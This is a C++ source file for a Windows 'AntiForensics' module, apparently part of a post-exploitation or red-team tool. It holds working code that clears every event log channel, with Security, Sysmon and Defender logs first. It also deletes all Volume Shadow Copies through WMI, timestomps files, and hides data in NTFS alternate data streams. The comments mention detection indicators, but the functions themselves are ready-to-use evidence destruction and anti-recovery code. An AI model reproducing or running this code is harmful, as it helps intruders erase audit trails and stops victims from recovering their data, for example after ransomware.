#include "AntiForensics.h"
#include <winevt.h>
#include <wbemidl.h>
#pragma comment(lib, "wevtapi.lib")
#pragma comment(lib, "wbemuuid.lib")

// ── Event log wipe ─────────────────────────────────────────────────────────────

// Priority channels: security-relevant logs first so the most important ones
// are cleared even if later channels fail.
static const wchar_t* kPriorityChannels[] = {
    L"Security",
    L"System",
    L"Application",
    L"Microsoft-Windows-Windows Defender/Operational",
    L"Microsoft-Windows-Sysmon/Operational",
    L"Microsoft-Windows-PowerShell/Operational",
    L"Microsoft-Windows-TaskScheduler/Operational",
    L"Microsoft-Windows-WMI-Activity/Operational",
    L"Microsoft-Windows-TerminalServices-LocalSessionManager/Operational",
};

std::string AntiForensics::ClearEventLogs() {
    std::string result;
    int cleared = 0, failed = 0;

    // Phase 1: clear priority channels by name
    for (auto ch : kPriorityChannels) {
        // Detection: EvtClearLog on Security/Sysmon channels from a non-system process
        // triggers an immediate Windows Defender alert and appears as EventID 1102 / 104.
        EVT_HANDLE hLog = EvtClearLog(NULL, ch, NULL, 0);
        if (hLog) {
            EvtClose(hLog);
            ++cleared;
            // Convert to narrow for result string
            int len = WideCharToMultiByte(CP_UTF8, 0, ch, -1, nullptr, 0, nullptr, nullptr);
            std::string chName(len > 0 ? len - 1 : 0, '\0');
            WideCharToMultiByte(CP_UTF8, 0, ch, -1, &chName[0], len, nullptr, nullptr);
            result += "cleared: " + chName + "\n";
        } else {
            ++failed;
        }
    }

    // Phase 2: enumerate all remaining channels via the channel enum API
    EVT_HANDLE hEnum = EvtOpenChannelEnum(NULL, 0);
    if (hEnum) {
        wchar_t chBuf[512] = {};
        DWORD chLen = 0;
        while (EvtNextChannelPath(hEnum, 512, chBuf, &chLen)) {
            EVT_HANDLE hLog = EvtClearLog(NULL, chBuf, NULL, 0);
            if (hLog) {
                EvtClose(hLog);
                ++cleared;
            } else {
                ++failed;
            }
        }
        EvtClose(hEnum);
    }

    result += "\nCleared: " + std::to_string(cleared) +
              "  Failed (no events / access denied): " + std::to_string(failed);
    return result;
}

// ── Volume Shadow Copy deletion via WMI ────────────────────────────────────────

std::string AntiForensics::DeleteShadowCopies() {
    // Detection: Win32_ShadowCopy enumeration + Delete() via WMI from a non-system binary
    // is the canonical "ransomware pre-encryption" indicator (MITRE T1490).

    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    bool ownCom = SUCCEEDED(hr);

    IWbemLocator* pLoc = nullptr;
    hr = CoCreateInstance(CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER,
                          IID_IWbemLocator, (void**)&pLoc);
    if (FAILED(hr)) {
        if (ownCom) CoUninitialize();
        return "vss: CoCreateInstance(WbemLocator) failed";
    }

    IWbemServices* pSvc = nullptr;
    hr = pLoc->ConnectServer(
        _bstr_t(L"ROOT\\CIMV2"), NULL, NULL, NULL, 0, NULL, NULL, &pSvc);
    pLoc->Release();
    if (FAILED(hr)) {
        if (ownCom) CoUninitialize();
        return "vss: WMI ConnectServer failed";
    }

    CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
                      RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);

    IEnumWbemClassObject* pEnum = nullptr;
    hr = pSvc->ExecQuery(
        _bstr_t(L"WQL"),
        _bstr_t(L"SELECT * FROM Win32_ShadowCopy"),
        WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
        NULL, &pEnum);

    if (FAILED(hr)) {
        pSvc->Release();
        if (ownCom) CoUninitialize();
        return "vss: ExecQuery failed";
    }

    int deleted = 0;
    IWbemClassObject* pObj = nullptr;
    ULONG nRet = 0;

    while (pEnum->Next(WBEM_INFINITE, 1, &pObj, &nRet) == S_OK && nRet == 1) {
        VARIANT vtPath;
        VariantInit(&vtPath);
        if (SUCCEEDED(pObj->Get(L"__PATH", 0, &vtPath, NULL, NULL)) &&
            vtPath.vt == VT_BSTR) {
            // ExecMethod on the object path with the "Delete" method
            hr = pSvc->ExecMethod(vtPath.bstrVal,
                                  _bstr_t(L"Delete"),
                                  0, NULL, NULL, NULL, NULL);
            if (SUCCEEDED(hr)) ++deleted;
        }
        VariantClear(&vtPath);
        pObj->Release();
    }

    pEnum->Release();
    pSvc->Release();
    if (ownCom) CoUninitialize();

    return "vss: deleted " + std::to_string(deleted) + " shadow copies";
}

// ── Timestomping ──────────────────────────────────────────────────────────────

std::string AntiForensics::Timestomp(const std::string& targetPath,
                                      const std::string& refPath) {
    FILETIME ftCreate = {}, ftAccess = {}, ftWrite = {};

    if (!refPath.empty()) {
        // Copy timestamps from reference file
        HANDLE hRef = CreateFileA(refPath.c_str(), GENERIC_READ, FILE_SHARE_READ,
                                   NULL, OPEN_EXISTING, 0, NULL);
        if (hRef == INVALID_HANDLE_VALUE)
            return "timestomp: cannot open ref file " + refPath;
        GetFileTime(hRef, &ftCreate, &ftAccess, &ftWrite);
        CloseHandle(hRef);
    } else {
        // Default: set to 2019-01-01 00:00:00 UTC (generic innocuous past date)
        SYSTEMTIME st = { 2019, 1, 0, 1, 0, 0, 0, 0 };
        SystemTimeToFileTime(&st, &ftCreate);
        ftAccess = ftWrite = ftCreate;
    }

    // Detection: SetFileTime from a suspicious process = timestomping anti-forensics.
    HANDLE hTarget = CreateFileA(targetPath.c_str(),
                                  FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ | FILE_SHARE_WRITE,
                                  NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
    if (hTarget == INVALID_HANDLE_VALUE)
        return "timestomp: cannot open target " + targetPath +
               " err=" + std::to_string(GetLastError());

    BOOL ok = SetFileTime(hTarget, &ftCreate, &ftAccess, &ftWrite);
    CloseHandle(hTarget);

    return ok ? ("timestomp: timestamps updated -> " + targetPath)
              : ("timestomp: SetFileTime failed err=" + std::to_string(GetLastError()));
}

// ── NTFS Alternate Data Stream ────────────────────────────────────────────────

std::string AntiForensics::AdsWrite(const std::string& filePath,
                                     const std::string& streamName,
                                     const std::string& data) {
    // ADS path format: C:\path\file.txt:hiddenStream
    // Detection: CreateFile with a colon in the path = NTFS ADS operation.
    // Data is invisible to normal dir listings and Windows Explorer.
    std::string adsPath = filePath + ":" + streamName;

    HANDLE hStream = CreateFileA(adsPath.c_str(), GENERIC_WRITE, 0, NULL,
                                  CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hStream == INVALID_HANDLE_VALUE)
        return "ads write: CreateFile failed for " + adsPath +
               " err=" + std::to_string(GetLastError());

    DWORD written = 0;
    BOOL ok = WriteFile(hStream, data.data(), (DWORD)data.size(), &written, NULL);
    CloseHandle(hStream);

    return ok ? ("ads write: " + std::to_string(written) + " bytes -> " + adsPath)
              : ("ads write: WriteFile failed err=" + std::to_string(GetLastError()));
}

std::string AntiForensics::AdsRead(const std::string& filePath,
                                    const std::string& streamName) {
    std::string adsPath = filePath + ":" + streamName;

    HANDLE hStream = CreateFileA(adsPath.c_str(), GENERIC_READ, FILE_SHARE_READ,
                                  NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hStream == INVALID_HANDLE_VALUE)
        return "ads read: stream not found: " + adsPath +
               " err=" + std::to_string(GetLastError());

    DWORD size = GetFileSize(hStream, NULL);
    if (size == 0 || size == INVALID_FILE_SIZE) {
        CloseHandle(hStream);
        return "ads read: empty stream " + adsPath;
    }

    std::string buf(size, '\0');
    DWORD read = 0;
    ReadFile(hStream, &buf[0], size, &read, NULL);
    CloseHandle(hStream);
    buf.resize(read);

    return "ads read [" + adsPath + "]:\n" + buf;
}
